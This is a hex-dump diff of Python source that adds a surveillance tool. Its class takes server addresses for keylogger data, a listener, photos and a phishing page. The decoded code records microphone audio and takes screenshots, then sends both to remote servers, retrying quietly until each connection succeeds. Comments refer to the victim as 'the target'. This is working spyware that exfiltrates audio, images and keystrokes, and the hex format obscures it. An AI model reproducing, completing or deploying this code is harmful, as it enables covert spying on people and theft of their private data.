-000025c0: 6420 3d20 6b65 792e 6368 6172 0d0a 0d0a  d = key.char....
-000025d0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000025e0: 616c 6c5f 7265 715f 6b65 7973 203d 207b  all_req_keys = {
-000025f0: 2203 223a 2073 656c 662e 636f 7079 5f64  ".": self.copy_d
-00002600: 6174 612c 2022 1622 3a20 7365 6c66 2e61  ata, ".": self.a
-00002610: 7070 656e 645f 7061 7374 657d 0d0a 2020  ppend_paste}..  
-00002620: 2020 2020 2020 2020 2020 2020 2020 2320                # 
-00002630: 2245 5458 2220 7374 616e 6473 2066 6f72  "ETX" stands for
-00002640: 2022 456e 642d 5465 7874 2d63 6861 7261   "End-Text-chara
-00002650: 6374 6572 2220 616e 6420 6973 2061 2063  cter" and is a c
-00002660: 6f6e 7472 6f6c 2063 6861 7261 6374 6572  ontrol character
-00002670: 2077 6869 6368 206b 6e6f 7773 2074 6865   which knows the
-00002680: 2063 6861 7261 6374 6572 206f 6620 636f   character of co
-00002690: 7079 696e 6720 736f 6d65 7468 696e 6720  pying something 
-000026a0: 6f6e 2074 6865 206b 6579 626f 6172 640d  on the keyboard.
-000026b0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-000026c0: 2023 2022 5359 4e22 2073 7461 6e64 7320   # "SYN" stands 
-000026d0: 666f 7220 2253 796e 6368 726f 6e6f 7573  for "Synchronous
-000026e0: 2049 646c 6522 2061 6e64 2069 7320 6120   Idle" and is a 
-000026f0: 636f 6e74 726f 6c20 6368 6172 6163 7465  control characte
-00002700: 7220 7768 6963 6820 6b6e 6f77 7320 7468  r which knows th
-00002710: 6520 6368 6172 6163 7465 7220 6f66 2070  e character of p
-00002720: 6173 7469 6e67 2073 6f6d 6574 6869 6e67  asting something
-00002730: 206f 6e20 7468 6520 6b65 7962 6f61 7264   on the keyboard
-00002740: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
-00002750: 2020 666f 7220 6561 6368 5f6b 6579 2069    for each_key i
-00002760: 6e20 616c 6c5f 7265 715f 6b65 7973 3a0d  n all_req_keys:.
-00002770: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-00002780: 2020 2020 2069 6620 6561 6368 5f6b 6579       if each_key
-00002790: 203d 3d20 6b65 792e 6368 6172 3a0d 0a20   == key.char:.. 
-000027a0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000027b0: 2020 2020 2020 2023 2049 6620 7468 6520         # If the 
-000027c0: 636f 7079 2063 6861 7261 6374 6572 2069  copy character i
-000027d0: 7320 7072 6573 7365 642c 2065 6163 6820  s pressed, each 
-000027e0: 6675 6e63 7469 6f6e 206f 6620 6561 6368  function of each
-000027f0: 2063 6861 7261 6374 6572 2077 696c 6c20   character will 
-00002800: 6265 2077 6f72 6b69 6e67 0d0a 2020 2020  be working..    
+00000160: 2069 705f 6f66 5f73 6572 7665 725f 6b65   ip_of_server_ke
+00000170: 796c 6f67 6765 725f 6461 7461 2c0d 0a20  ylogger_data,.. 
+00000180: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00000190: 706f 7274 5f6f 665f 7365 7276 6572 5f6b  port_of_server_k
+000001a0: 6579 6c6f 6767 6572 5f64 6174 612c 2069  eylogger_data, i
+000001b0: 705f 6f66 5f73 6572 7665 725f 6c69 7374  p_of_server_list
+000001c0: 656e 6572 2c20 706f 7274 5f6f 665f 7365  ener, port_of_se
+000001d0: 7276 6572 5f6c 6973 7465 6e65 722c 2069  rver_listener, i
+000001e0: 705f 6f66 5f74 696d 6572 2c0d 0a20 2020  p_of_timer,..   
+000001f0: 2020 2020 2020 2020 2020 2020 2020 706f                po
+00000200: 7274 5f6f 665f 7469 6d65 722c 2064 7572  rt_of_timer, dur
+00000210: 6174 696f 6e5f 696e 5f73 6563 6f6e 6473  ation_in_seconds
+00000220: 3d36 302c 2070 6869 7368 696e 675f 7765  =60, phishing_we
+00000230: 623d 4e6f 6e65 293a 0d0a 2020 2020 2020  b=None):..      
+00000240: 2020 2320 2264 7572 6174 696f 6e5f 696e    # "duration_in
+00000250: 5f73 6563 6f6e 6473 2220 7465 6c6c 7320  _seconds" tells 
+00000260: 7468 6520 7072 6f67 7261 6d6d 2068 6f77  the programm how
+00000270: 206c 6f6e 6720 6974 2073 686f 756c 6420   long it should 
+00000280: 6c61 7374 2074 6865 2064 6566 6175 6c74  last the default
+00000290: 2074 696d 6520 6973 2036 3020 7365 636f   time is 60 seco
+000002a0: 6e64 7320 7468 6174 2773 2031 204d 696e  nds that's 1 Min
+000002b0: 7574 650d 0a20 2020 2020 2020 2061 7373  ute..        ass
+000002c0: 6572 7420 6475 7261 7469 6f6e 5f69 6e5f  ert duration_in_
+000002d0: 7365 636f 6e64 7320 3e3d 2036 302c 2066  seconds >= 60, f
+000002e0: 227b 6475 7261 7469 6f6e 5f69 6e5f 7365  "{duration_in_se
+000002f0: 636f 6e64 737d 2069 7320 6e6f 7420 6772  conds} is not gr
+00000300: 6561 7465 7220 616e 6420 6e6f 7420 6571  eater and not eq
+00000310: 7561 6c20 746f 2036 3022 0d0a 2020 2020  ual to 60"..    
+00000320: 2020 2020 2320 2264 7572 6174 696f 6e5f      # "duration_
+00000330: 696e 5f73 6563 6f6e 6473 2220 7368 6f75  in_seconds" shou
+00000340: 6c64 2061 6c77 6179 7320 6265 2062 6967  ld always be big
+00000350: 6765 7220 7468 616e 2036 3020 7365 636f  ger than 60 seco
+00000360: 6e64 730d 0a0d 0a20 2020 2020 2020 2073  nds....        s
+00000370: 656c 662e 6970 5f70 686f 746f 7320 3d20  elf.ip_photos = 
+00000380: 6970 5f6f 665f 7365 7276 6572 5f70 686f  ip_of_server_pho
+00000390: 746f 730d 0a20 2020 2020 2020 2073 656c  tos..        sel
+000003a0: 662e 706f 7274 5f70 686f 746f 7320 3d20  f.port_photos = 
+000003b0: 706f 7274 5f6f 665f 7365 7276 6572 5f70  port_of_server_p
+000003c0: 686f 746f 730d 0a20 2020 2020 2020 2073  hotos..        s
+000003d0: 656c 662e 6970 5f6b 6579 6c6f 6767 6572  elf.ip_keylogger
+000003e0: 203d 2069 705f 6f66 5f73 6572 7665 725f   = ip_of_server_
+000003f0: 6b65 796c 6f67 6765 725f 6461 7461 0d0a  keylogger_data..
+00000400: 2020 2020 2020 2020 7365 6c66 2e70 6f72          self.por
+00000410: 745f 6b65 796c 6f67 6765 7220 3d20 706f  t_keylogger = po
+00000420: 7274 5f6f 665f 7365 7276 6572 5f6b 6579  rt_of_server_key
+00000430: 6c6f 6767 6572 5f64 6174 610d 0a20 2020  logger_data..   
+00000440: 2020 2020 2073 656c 662e 6970 5f6c 6973       self.ip_lis
+00000450: 7465 6e65 7220 3d20 6970 5f6f 665f 7365  tener = ip_of_se
+00000460: 7276 6572 5f6c 6973 7465 6e65 720d 0a20  rver_listener.. 
+00000470: 2020 2020 2020 2073 656c 662e 706f 7274         self.port
+00000480: 5f6c 6973 7465 6e65 7220 3d20 706f 7274  _listener = port
+00000490: 5f6f 665f 7365 7276 6572 5f6c 6973 7465  _of_server_liste
+000004a0: 6e65 720d 0a20 2020 2020 2020 2073 656c  ner..        sel
+000004b0: 662e 6475 7261 7469 6f6e 203d 2064 7572  f.duration = dur
+000004c0: 6174 696f 6e5f 696e 5f73 6563 6f6e 6473  ation_in_seconds
+000004d0: 0d0a 2020 2020 2020 2020 7365 6c66 2e69  ..        self.i
+000004e0: 705f 7469 6d65 7220 3d20 6970 5f6f 665f  p_timer = ip_of_
+000004f0: 7469 6d65 720d 0a20 2020 2020 2020 2073  timer..        s
+00000500: 656c 662e 706f 7274 5f74 696d 6572 203d  elf.port_timer =
+00000510: 2070 6f72 745f 6f66 5f74 696d 6572 0d0a   port_of_timer..
+00000520: 2020 2020 2020 2020 7365 6c66 2e70 6869          self.phi
+00000530: 7368 696e 6720 3d20 7068 6973 6869 6e67  shing = phishing
+00000540: 5f77 6562 0d0a 0d0a 2020 2020 2020 2020  _web....        
+00000550: 7365 6c66 2e63 6865 636b 203d 205b 5d0d  self.check = [].
+00000560: 0a20 2020 2020 2020 2073 656c 662e 6361  .        self.ca
+00000570: 7073 203d 2046 616c 7365 0d0a 2020 2020  ps = False..    
+00000580: 2020 2020 7365 6c66 2e72 6963 6874 6967      self.richtig
+00000590: 655f 6c69 7374 6520 3d20 5b5d 0d0a 2020  e_liste = []..  
+000005a0: 2020 2020 2020 7365 6c66 2e63 6f6f 7264        self.coord
+000005b0: 696e 6174 6573 203d 205b 5d0d 0a20 2020  inates = []..   
+000005c0: 2020 2020 2073 656c 662e 776f 7264 203d       self.word =
+000005d0: 204e 6f6e 650d 0a20 2020 2020 2020 2073   None..        s
+000005e0: 656c 662e 7365 636f 6e64 7320 3d20 5b5d  elf.seconds = []
+000005f0: 0d0a 2020 2020 2020 2020 7365 6c66 2e66  ..        self.f
+00000600: 7261 6d65 7320 3d20 4e6f 6e65 0d0a 2020  rames = None..  
+00000610: 2020 2020 2020 7365 6c66 2e61 6d6f 756e        self.amoun
+00000620: 7420 3d20 300d 0a20 2020 2020 2020 2073  t = 0..        s
+00000630: 656c 662e 696d 6167 6573 5f64 6174 6120  elf.images_data 
+00000640: 3d20 7b7d 0d0a 2020 2020 2020 2020 7365  = {}..        se
+00000650: 6c66 2e74 7275 655f 636f 6e6e 6563 7469  lf.true_connecti
+00000660: 6f6e 203d 2046 616c 7365 0d0a 0d0a 0d0a  on = False......
+00000670: 2020 2020 6465 6620 6461 7465 6e5f 6175      def daten_au
+00000680: 666e 6568 656d 656e 2873 656c 6629 3a0d  fnehemen(self):.
+00000690: 0a20 2020 2020 2020 2077 6869 6c65 2054  .        while T
+000006a0: 7275 653a 0d0a 2020 2020 2020 2020 2020  rue:..          
+000006b0: 2020 7472 793a 0d0a 2020 2020 2020 2020    try:..        
+000006c0: 2020 2020 2020 2020 6c69 7374 656e 696e          listenin
+000006d0: 675f 6461 7461 203d 2073 6f63 6b65 742e  g_data = socket.
+000006e0: 736f 636b 6574 2873 6f63 6b65 742e 4146  socket(socket.AF
+000006f0: 5f49 4e45 542c 2073 6f63 6b65 742e 534f  _INET, socket.SO
+00000700: 434b 5f53 5452 4541 4d29 0d0a 2020 2020  CK_STREAM)..    
+00000710: 2020 2020 2020 2020 2020 2020 6c69 7374              list
+00000720: 656e 696e 675f 6461 7461 2e63 6f6e 6e65  ening_data.conne
+00000730: 6374 2828 7365 6c66 2e69 705f 6c69 7374  ct((self.ip_list
+00000740: 656e 6572 2c20 7365 6c66 2e70 6f72 745f  ener, self.port_
+00000750: 6c69 7374 656e 6572 2929 0d0a 2020 2020  listener))..    
+00000760: 2020 2020 2020 2020 2020 2020 7365 6c66              self
+00000770: 2e74 7275 655f 636f 6e6e 6563 7469 6f6e  .true_connection
+00000780: 203d 2054 7275 650d 0a20 2020 2020 2020   = True..       
+00000790: 2020 2020 2020 2020 2062 7265 616b 0d0a           break..
+000007a0: 2020 2020 2020 2020 2020 2020 6578 6365              exce
+000007b0: 7074 3a0d 0a20 2020 2020 2020 2020 2020  pt:..           
+000007c0: 2020 2020 2063 6f6e 7469 6e75 650d 0a0d       continue...
+000007d0: 0a20 2020 2020 2020 2074 7279 3a0d 0a20  .        try:.. 
+000007e0: 2020 2020 2020 2020 2020 2066 6f72 6d61             forma
+000007f0: 7420 3d20 7079 6175 6469 6f2e 7061 496e  t = pyaudio.paIn
+00000800: 7431 360d 0a20 2020 2020 2020 2020 2020  t16..           
+00000810: 2063 6861 6e6e 656c 7320 3d20 320d 0a20   channels = 2.. 
+00000820: 2020 2020 2020 2020 2020 2072 6174 6520             rate 
+00000830: 3d20 3434 3130 300d 0a20 2020 2020 2020  = 44100..       
+00000840: 2020 2020 2063 6875 6e6b 203d 2031 3032       chunk = 102
+00000850: 340d 0a20 2020 2020 2020 2020 2020 2073  4..            s
+00000860: 6563 6f6e 6473 203d 2073 656c 662e 6475  econds = self.du
+00000870: 7261 7469 6f6e 202b 2031 0d0a 0d0a 2020  ration + 1....  
+00000880: 2020 2020 2020 2020 2020 6175 6469 6f20            audio 
+00000890: 3d20 7079 6175 6469 6f2e 5079 4175 6469  = pyaudio.PyAudi
+000008a0: 6f28 290d 0a0d 0a20 2020 2020 2020 2020  o()....         
+000008b0: 2020 2023 2073 7461 7274 2052 6563 6f72     # start Recor
+000008c0: 6469 6e67 0d0a 2020 2020 2020 2020 2020  ding..          
+000008d0: 2020 7374 7265 616d 203d 2061 7564 696f    stream = audio
+000008e0: 2e6f 7065 6e28 666f 726d 6174 3d66 6f72  .open(format=for
+000008f0: 6d61 742c 2063 6861 6e6e 656c 733d 6368  mat, channels=ch
+00000900: 616e 6e65 6c73 2c0d 0a20 2020 2020 2020  annels,..       
+00000910: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00000920: 2020 2020 2020 2020 2072 6174 653d 7261           rate=ra
+00000930: 7465 2c20 696e 7075 743d 5472 7565 2c0d  te, input=True,.
+00000940: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+00000950: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00000960: 2066 7261 6d65 735f 7065 725f 6275 6666   frames_per_buff
+00000970: 6572 3d63 6875 6e6b 290d 0a20 2020 2020  er=chunk)..     
+00000980: 2020 2020 2020 2023 2070 7269 6e74 2822         # print("
+00000990: 7265 636f 7264 696e 672e 2e2e 2229 0d0a  recording...")..
+000009a0: 2020 2020 2020 2020 2020 2020 6672 616d              fram
+000009b0: 6573 203d 205b 5d0d 0a0d 0a20 2020 2020  es = []....     
+000009c0: 2020 2020 2020 2066 6f72 2069 2069 6e20         for i in 
+000009d0: 7261 6e67 6528 302c 2069 6e74 2872 6174  range(0, int(rat
+000009e0: 6520 2f20 6368 756e 6b20 2a20 7365 636f  e / chunk * seco
+000009f0: 6e64 7329 293a 0d0a 2020 2020 2020 2020  nds)):..        
+00000a00: 2020 2020 2020 2020 6461 7461 203d 2073          data = s
+00000a10: 7472 6561 6d2e 7265 6164 2863 6875 6e6b  tream.read(chunk
+00000a20: 290d 0a20 2020 2020 2020 2020 2020 2020  )..             
+00000a30: 2020 2066 7261 6d65 732e 6170 7065 6e64     frames.append
+00000a40: 2864 6174 6129 0d0a 0d0a 2020 2020 2020  (data)....      
+00000a50: 2020 2020 2020 2320 7072 696e 7428 2266        # print("f
+00000a60: 696e 6973 6865 6420 7265 636f 7264 696e  inished recordin
+00000a70: 6722 290d 0a0d 0a20 2020 2020 2020 2020  g")....         
+00000a80: 2020 2023 2073 746f 7020 5265 636f 7264     # stop Record
+00000a90: 696e 670d 0a20 2020 2020 2020 2020 2020  ing..           
+00000aa0: 2073 7472 6561 6d2e 7374 6f70 5f73 7472   stream.stop_str
+00000ab0: 6561 6d28 290d 0a20 2020 2020 2020 2020  eam()..         
+00000ac0: 2020 2073 7472 6561 6d2e 636c 6f73 6528     stream.close(
+00000ad0: 290d 0a20 2020 2020 2020 2020 2020 2061  )..            a
+00000ae0: 7564 696f 2e74 6572 6d69 6e61 7465 2829  udio.terminate()
+00000af0: 0d0a 0d0a 2020 2020 2020 2020 2020 2020  ....            
+00000b00: 2320 436f 6e6e 6563 7469 6f6e 2077 6974  # Connection wit
+00000b10: 6820 5365 7276 6572 4c69 7374 656e 6572  h ServerListener
+00000b20: 0d0a 0d0a 2020 2020 2020 2020 2020 2020  ....            
+00000b30: 7365 6c66 2e66 7261 6d65 7320 3d20 7374  self.frames = st
+00000b40: 7228 6672 616d 6573 290d 0a20 2020 2020  r(frames)..     
+00000b50: 2020 2020 2020 2023 2049 6620 7468 6520         # If the 
+00000b60: 7365 7276 6572 2069 7320 7468 6520 646f  server is the do
+00000b70: 776e 2069 7420 7769 6c6c 2073 746f 7265  wn it will store
+00000b80: 2074 6865 2064 6174 6120 6c6f 6361 6c6c   the data locall
+00000b90: 7920 616e 6420 7761 6974 2075 6e74 696c  y and wait until
+00000ba0: 2074 6865 2073 6572 7665 7220 6973 2061   the server is a
+00000bb0: 7661 696c 6162 6c65 2061 6761 696e 2e0d  vailable again..
+00000bc0: 0a20 2020 2020 2020 2020 2020 2077 6869  .            whi
+00000bd0: 6c65 2054 7275 653a 0d0a 2020 2020 2020  le True:..      
+00000be0: 2020 2020 2020 2020 2020 7472 793a 0d0a            try:..
+00000bf0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00000c00: 2020 2020 6c69 7374 656e 696e 675f 6461      listening_da
+00000c10: 7461 2e73 656e 6428 7365 6c66 2e66 7261  ta.send(self.fra
+00000c20: 6d65 732e 656e 636f 6465 2829 290d 0a20  mes.encode()).. 
+00000c30: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00000c40: 2020 2062 7265 616b 0d0a 2020 2020 2020     break..      
+00000c50: 2020 2020 2020 2020 2020 6578 6365 7074            except
+00000c60: 3a0d 0a20 2020 2020 2020 2020 2020 2020  :..             
+00000c70: 2020 2020 2020 2063 6f6e 7469 6e75 650d         continue.
+00000c80: 0a0d 0a0d 0a20 2020 2020 2020 2065 7863  .....        exc
+00000c90: 6570 7420 4f53 4572 726f 723a 0d0a 2020  ept OSError:..  
+00000ca0: 2020 2020 2020 2020 2020 7072 696e 7428            print(
+00000cb0: 224e 4f20 4d49 4352 4f50 484f 4e45 2044  "NO MICROPHONE D
+00000cc0: 4554 4543 5445 4420 4f52 204d 4943 524f  ETECTED OR MICRO
+00000cd0: 5048 4f4e 4520 5345 5454 494e 4720 4449  PHONE SETTING DI
+00000ce0: 5341 424c 4544 2229 0d0a 2020 2020 2020  SABLED")..      
+00000cf0: 2020 2020 2020 6e6f 5f6d 6963 726f 666f        no_microfo
+00000d00: 6e20 3d20 2254 4845 2054 4152 4745 5420  n = "THE TARGET 
+00000d10: 4841 5320 4e4f 204d 4943 524f 5048 4f4e  HAS NO MICROPHON
+00000d20: 4520 4f4e 220d 0a0d 0a20 2020 2020 2020  E ON"....       
+00000d30: 2020 2020 2023 2049 6620 7468 6520 7365       # If the se
+00000d40: 7276 6572 2069 7320 7468 6520 646f 776e  rver is the down
+00000d50: 2069 7420 7769 6c6c 2073 746f 7265 2074   it will store t
+00000d60: 6865 2064 6174 6120 6c6f 6361 6c6c 7920  he data locally 
+00000d70: 616e 6420 7761 6974 2075 6e74 696c 2074  and wait until t
+00000d80: 6865 2073 6572 7665 7220 6973 2061 7661  he server is ava
+00000d90: 696c 6162 6c65 2061 6761 696e 2e0d 0a20  ilable again... 
+00000da0: 2020 2020 2020 2020 2020 2077 6869 6c65             while
+00000db0: 2054 7275 653a 0d0a 2020 2020 2020 2020   True:..        
+00000dc0: 2020 2020 2020 2020 7472 793a 0d0a 2020          try:..  
+00000dd0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00000de0: 2020 6c69 7374 656e 696e 675f 6461 7461    listening_data
+00000df0: 2e73 656e 6428 6e6f 5f6d 6963 726f 666f  .send(no_microfo
+00000e00: 6e2e 656e 636f 6465 2829 290d 0a20 2020  n.encode())..   
+00000e10: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00000e20: 2062 7265 616b 0d0a 2020 2020 2020 2020   break..        
+00000e30: 2020 2020 2020 2020 6578 6365 7074 3a0d          except:.
+00000e40: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+00000e50: 2020 2020 2063 6f6e 7469 6e75 650d 0a20       continue.. 
+00000e60: 2020 2020 2020 2020 2020 2023 2053 656e             # Sen
+00000e70: 6473 2064 6174 6120 746f 2053 6572 7665  ds data to Serve
+00000e80: 724c 6973 7465 6e65 720d 0a0d 0a20 2020  rListener....   
+00000e90: 2064 6566 2063 6c69 656e 7428 7365 6c66   def client(self
+00000ea0: 293a 0d0a 2020 2020 2020 2020 7365 6c66  ):..        self
+00000eb0: 2e61 6d6f 756e 7420 2b3d 2031 0d0a 2020  .amount += 1..  
+00000ec0: 2020 2020 2020 2320 5468 6973 2063 6f6e        # This con
+00000ed0: 6e65 6374 7320 746f 2074 6865 2073 6572  nects to the ser
+00000ee0: 7665 7220 796f 7520 7370 6563 6966 6965  ver you specifie
+00000ef0: 640d 0a20 2020 2020 2020 2069 6d61 6765  d..        image
+00000f00: 203d 2070 672e 7363 7265 656e 7368 6f74   = pg.screenshot
+00000f10: 2829 0d0a 2020 2020 2020 2020 2320 2269  ()..        # "i
+00000f20: 6d61 6765 2220 7363 7265 656e 7368 6f74  mage" screenshot
+00000f30: 7320 7468 6520 6375 7272 656e 7420 696d  s the current im
+00000f40: 6167 6520 6166 7465 7220 6120 7370 6563  age after a spec
+00000f50: 6966 6963 2074 696d 650d 0a20 2020 2020  ific time..     
+00000f60: 2020 2066 6f74 6f6e 616d 6520 3d20 6622     fotoname = f"
+00000f70: 494d 4147 4520 287b 7365 6c66 2e61 6d6f  IMAGE ({self.amo
+00000f80: 756e 747d 292e 706e 6722 0d0a 2020 2020  unt}).png"..    
+00000f90: 2020 2020 2320 4e61 6d65 206f 6620 7468      # Name of th
+00000fa0: 6520 696d 6167 650d 0a20 2020 2020 2020  e image..       
+00000fb0: 2069 6d61 6765 2e73 6176 6528 666f 746f   image.save(foto
+00000fc0: 6e61 6d65 290d 0a20 2020 2020 2020 2023  name)..        #
+00000fd0: 2053 6176 6573 2074 6865 2069 6d61 6765   Saves the image
+00000fe0: 2069 6e20 7468 6520 6375 7272 656e 7420   in the current 
+00000ff0: 6469 7265 6374 6f72 790d 0a20 2020 2020  directory..     
+00001000: 2020 2066 6f72 2065 7665 7279 5f69 6d61     for every_ima
+00001010: 6765 2069 6e20 6f73 2e6c 6973 7464 6972  ge in os.listdir
+00001020: 2829 3a0d 0a20 2020 2020 2020 2020 2020  ():..           
+00001030: 2069 6620 2249 4d41 4745 2220 696e 2065   if "IMAGE" in e
+00001040: 7665 7279 5f69 6d61 6765 3a0d 0a20 2020  very_image:..   
+00001050: 2020 2020 2020 2020 2020 2020 2077 6974               wit
+00001060: 6820 6f70 656e 2865 7665 7279 5f69 6d61  h open(every_ima
+00001070: 6765 2c20 2272 6222 2920 6173 2066 696c  ge, "rb") as fil
+00001080: 653a 0d0a 2020 2020 2020 2020 2020 2020  e:..            
+00001090: 2020 2020 2020 2020 6461 7461 203d 2062          data = b
+000010a0: 2222 0d0a 2020 2020 2020 2020 2020 2020  ""..            
+000010b0: 2020 2020 2020 2020 666f 7220 6c69 6e65          for line
+000010c0: 2069 6e20 6669 6c65 3a0d 0a20 2020 2020   in file:..     
+000010d0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000010e0: 2020 2064 6174 6120 2b3d 206c 696e 650d     data += line.
+000010f0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+00001100: 2020 2020 2023 2047 6574 7320 616c 6c20       # Gets all 
+00001110: 7468 6520 6461 7461 2061 6e64 2073 746f  the data and sto
+00001120: 7265 7320 6974 2069 6e20 2273 656c 662e  res it in "self.
+00001130: 696d 6167 6573 5f64 6174 6122 0d0a 2020  images_data"..  
+00001140: 2020 2020 2020 2020 2020 2020 2020 7365                se
+00001150: 6c66 2e69 6d61 6765 735f 6461 7461 5b65  lf.images_data[e
+00001160: 7665 7279 5f69 6d61 6765 5d20 3d20 6461  very_image] = da
+00001170: 7461 0d0a 2020 2020 2020 2020 2320 4e6f  ta..        # No
+00001180: 206d 6174 7465 7220 6966 2074 6865 2074   matter if the t
+00001190: 6172 6765 7473 2064 656c 6574 6573 2074  argets deletes t
+000011a0: 6865 2069 6d61 6765 2069 7420 7769 6c6c  he image it will
+000011b0: 2062 6520 7374 6f72 6564 206c 6f63 616c   be stored local
+000011c0: 6c79 0d0a 0d0a 2020 2020 2020 2020 6f73  ly....        os
+000011d0: 2e72 656d 6f76 6528 666f 746f 6e61 6d65  .remove(fotoname
+000011e0: 290d 0a20 2020 2020 2020 2023 2054 6869  )..        # Thi
+000011f0: 7320 6465 6c65 7465 7320 7468 6520 7068  s deletes the ph
+00001200: 6f74 6f0d 0a0d 0a20 2020 2064 6566 2073  oto....    def s
+00001210: 656e 645f 696d 6167 6528 7365 6c66 2c20  end_image(self, 
+00001220: 6970 5f70 686f 746f 732c 2070 6f72 745f  ip_photos, port_
+00001230: 7068 6f74 6f73 293a 0d0a 2020 2020 2020  photos):..      
+00001240: 2020 2320 4966 2074 6865 2073 6572 7665    # If the serve
+00001250: 7220 6973 2074 6865 2064 6f77 6e20 6974  r is the down it
+00001260: 2077 696c 6c20 7374 6f72 6520 7468 6520   will store the 
+00001270: 6461 7461 206c 6f63 616c 6c79 2061 6e64  data locally and
+00001280: 2077 6169 7420 756e 7469 6c20 7468 6520   wait until the 
+00001290: 7365 7276 6572 2069 7320 6176 6169 6c61  server is availa
+000012a0: 626c 6520 6167 6169 6e2e 0d0a 2020 2020  ble again...    
+000012b0: 2020 2020 7768 696c 6520 5472 7565 3a0d      while True:.
+000012c0: 0a20 2020 2020 2020 2020 2020 2074 7279  .            try
+000012d0: 3a0d 0a20 2020 2020 2020 2020 2020 2020  :..             
+000012e0: 2020 2073 656e 645f 696d 6167 6573 203d     send_images =
+000012f0: 2073 6f63 6b65 742e 736f 636b 6574 2873   socket.socket(s
+00001300: 6f63 6b65 742e 4146 5f49 4e45 542c 2073  ocket.AF_INET, s
+00001310: 6f63 6b65 742e 534f 434b 5f53 5452 4541  ocket.SOCK_STREA
+00001320: 4d29 0d0a 2020 2020 2020 2020 2020 2020  M)..            
+00001330: 2020 2020 7365 6e64 5f69 6d61 6765 732e      send_images.
+00001340: 636f 6e6e 6563 7428 2869 705f 7068 6f74  connect((ip_phot
+00001350: 6f73 2c20 706f 7274 5f70 686f 746f 7329  os, port_photos)
+00001360: 290d 0a0d 0a20 2020 2020 2020 2020 2020  )....           
+00001370: 2020 2020 2073 656e 645f 696d 6167 6573       send_images
+00001380: 2e73 656e 6428 7374 7228 7365 6c66 2e69  .send(str(self.i
+00001390: 6d61 6765 735f 6461 7461 292e 656e 636f  mages_data).enco
+000013a0: 6465 2829 290d 0a20 2020 2020 2020 2020  de())..         
+000013b0: 2020 2020 2020 2062 7265 616b 0d0a 2020         break..  
+000013c0: 2020 2020 2020 2020 2020 6578 6365 7074            except
+000013d0: 3a0d 0a20 2020 2020 2020 2020 2020 2020  :..             
+000013e0: 2020 2063 6f6e 7469 6e75 650d 0a0d 0a20     continue.... 
+000013f0: 2020 2064 6566 2063 6f75 6e74 646f 776e     def countdown
+00001400: 5f73 656e 6428 7365 6c66 2c20 7a65 6974  _send(self, zeit
+00001410: 2c20 6970 5f70 686f 746f 732c 2070 6f72  , ip_photos, por
+00001420: 745f 7068 6f74 6f73 2c20 6970 5f6b 6579  t_photos, ip_key
+00001430: 6c6f 6767 6572 2c20 706f 7274 5f6b 6579  logger, port_key
+00001440: 6c6f 6767 6572 293a 0d0a 2020 2020 2020  logger):..      
+00001450: 2020 7365 636f 6e64 735f 6c69 7374 203d    seconds_list =
+00001460: 205b 7a61 686c 2066 6f72 207a 6168 6c20   [zahl for zahl 
+00001470: 696e 2072 616e 6765 2830 2c20 7a65 6974  in range(0, zeit
+00001480: 202b 2031 2c20 3230 2920 6966 207a 6168   + 1, 20) if zah
+00001490: 6c20 213d 2030 5d0d 0a20 2020 2020 2020  l != 0]..       
+000014a0: 2023 2054 6865 2073 6563 6f6e 6473 2074   # The seconds t
+000014b0: 6865 2069 6d61 6765 2077 696c 6c20 6265  he image will be
+000014c0: 2073 656e 7420 696e 2032 3020 7374 6570   sent in 20 step
+000014d0: 7320 746f 2074 6865 2073 6572 7665 7220  s to the server 
+000014e0: 7769 6c6c 2062 6520 7361 7665 6420 696e  will be saved in
+000014f0: 2022 7365 636f 6e64 735f 6c69 7374 220d   "seconds_list".
+00001500: 0a20 2020 2020 2020 2070 7269 6e74 2873  .        print(s
+00001510: 6563 6f6e 6473 5f6c 6973 7429 0d0a 2020  econds_list)..  
+00001520: 2020 2020 2020 6b65 795f 6461 7461 203d        key_data =
+00001530: 2073 6f63 6b65 742e 736f 636b 6574 2873   socket.socket(s
+00001540: 6f63 6b65 742e 4146 5f49 4e45 542c 2073  ocket.AF_INET, s
+00001550: 6f63 6b65 742e 534f 434b 5f53 5452 4541  ocket.SOCK_STREA
+00001560: 4d29 0d0a 0d0a 2020 2020 2020 2020 7472  M)....        tr
+00001570: 793a 0d0a 2020 2020 2020 2020 2020 2020  y:..            
+00001580: 666f 7220 7820 696e 2072 616e 6765 287a  for x in range(z
+00001590: 6569 7420 2b20 3129 3a0d 0a20 2020 2020  eit + 1):..     
+000015a0: 2020 2020 2020 2020 2020 2070 7269 6e74             print
+000015b0: 2878 290d 0a20 2020 2020 2020 2020 2020  (x)..           
+000015c0: 2020 2020 207a 6569 7420 2d3d 2031 0d0a       zeit -= 1..
+000015d0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000015e0: 7469 6d65 2e73 6c65 6570 2831 290d 0a20  time.sleep(1).. 
+000015f0: 2020 2020 2020 2020 2020 2020 2020 2069                 i
+00001600: 6620 7820 696e 2073 6563 6f6e 6473 5f6c  f x in seconds_l
+00001610: 6973 743a 0d0a 2020 2020 2020 2020 2020  ist:..          
+00001620: 2020 2020 2020 2020 2020 7365 6c66 2e63            self.c
+00001630: 6c69 656e 7428 290d 0a20 2020 2020 2020  lient()..       
+00001640: 2020 2020 2020 2020 2020 2020 2023 2054               # T
+00001650: 6865 2069 6d61 6765 7320 7769 6c6c 2062  he images will b
+00001660: 6520 7365 6e74 0d0a 2020 2020 2020 2020  e sent..        
+00001670: 2020 2020 7768 696c 6520 5472 7565 3a0d      while True:.
+00001680: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+00001690: 2074 7279 3a0d 0a20 2020 2020 2020 2020   try:..         
+000016a0: 2020 2020 2020 2020 2020 206b 6579 5f64             key_d
+000016b0: 6174 612e 636f 6e6e 6563 7428 2869 705f  ata.connect((ip_
